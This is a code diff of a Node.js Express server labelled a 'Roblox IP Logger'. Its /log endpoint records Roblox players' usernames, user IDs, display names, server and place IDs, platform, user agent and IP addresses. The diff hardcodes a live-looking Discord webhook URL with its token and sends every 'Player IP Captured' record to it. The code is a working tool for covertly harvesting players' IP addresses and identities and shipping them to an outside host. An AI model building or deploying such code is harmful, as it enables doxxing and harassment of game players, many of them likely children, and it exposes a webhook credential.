@@ -1,63 +1,58 @@
 const express = require('express');
 const app = express();
 
-app.use((req, res, next) => {
-    console.log(`${new Date().toISOString()} | ${req.method} ${req.path} | IP: ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip}`);
-    next();
-});
+// YOUR DISCORD WEBHOOK - ALREADY CONFIGURED
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';
 
 app.get('/log', (req, res) => {
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.headers['x-real-ip'] || 
-                     req.connection.remoteAddress || 
-                     req.socket.remoteAddress || 
                      req.ip || 'Unknown';
     
     const playerData = {
         timestamp: new Date().toISOString(),
         username: req.query.playerName || 'Unknown',
         userId: req.query.userId || 'Unknown',
+        displayName: req.query.displayName || 'Unknown',
         placeId: req.query.placeId || 'Unknown',
         jobId: req.query.jobId || 'Unknown',
+        osPlatform: req.query.osPlatform || 'Unknown',
         ipAddress: clientIP,
-        userAgent: req.get('User-Agent') || 'Unknown',
-        headers: req.headers,
-        query: req.query
+        userAgent: req.get('User-Agent') || 'Unknown'
     };
     
-    // Log to console (Railway logs)
-    console.log('🎮 PLAYER LOGGED:', JSON.stringify(playerData, null, 2));
+    console.log('🎮 PLAYER:', JSON.stringify(playerData, null, 2));
     
-    // Discord webhook (optional - add your URL as env var)
-    if (process.env.DISCORD_WEBHOOK) {
-        fetch(process.env.DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: '🕵️ Roblox Player Captured',
-                    color: 16711680,
-                    fields: [
-                        { name: '👤 Username', value: playerData.username, inline: true },
-                        { name: '🆔 UserID', value: playerData.userId, inline: true },
-                        { name: '🌐 IP Address', value: `\`${playerData.ipAddress}\``, inline: true },
-                        { name: '📍 Place ID', value: playerData.placeId, inline: true },
-                        { name: '🆔 Job ID', value: playerData.jobId, inline: true },
-                        { name: '📱 User-Agent', value: playerData.userAgent.slice(0, 50) + '...', inline: false }
-                    ],
-                    timestamp: playerData.timestamp
-                }]
-            })
-        }).catch(console.error);
-    }
+    // SEND TO YOUR DISCORD (ALREADY CONFIGURED)
+    fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [{
+                title: '🕵️ Roblox Player IP Captured',
+                description: `\`UserID: ${playerData.userId}\``,
+                color: 16711680, // Red
+                fields: [
+                    { name: '👤 Player', value: `${playerData.username} (${playerData.displayName})`, inline: true },
+                    { name: '🌐 IP Address', value: `\`${playerData.ipAddress}\``, inline: true },
+                    { name: '📍 Place', value: playerData.placeId, inline: true },
+                    { name: '🆔 Server', value: playerData.jobId.slice(-8), inline: true },
+                    { name: '💻 Platform', value: playerData.osPlatform, inline: true },
+                    { name: '📱 User-Agent', value: playerData.userAgent.slice(0, 40) + '...', inline: false }
+                ],
+                thumbnail: { url: 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&format=png&username=' + playerData.username },
+                timestamp: playerData.timestamp,
+                footer: { text: 'Roblox IP Logger | Railway' }
+            }]
+        })
+    }).catch(err => console.error('Discord failed:', err));
     
-    res.status(200).json({ status: 'logged', data: playerData });
+    res.json({ status: 'logged', ip: clientIP });
 });
 
-app.get('/health', (req, res) => res.send('Logger active'));
+app.get('/health', (req, res) => res.send('✅ Logger Active'));
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-    console.log(`🚀 IP Logger running on port ${port}`);
-    console.log(`📡 Logging endpoint: /log`);
+    console.log(`🚀 Logger running on port ${port}`);
 });
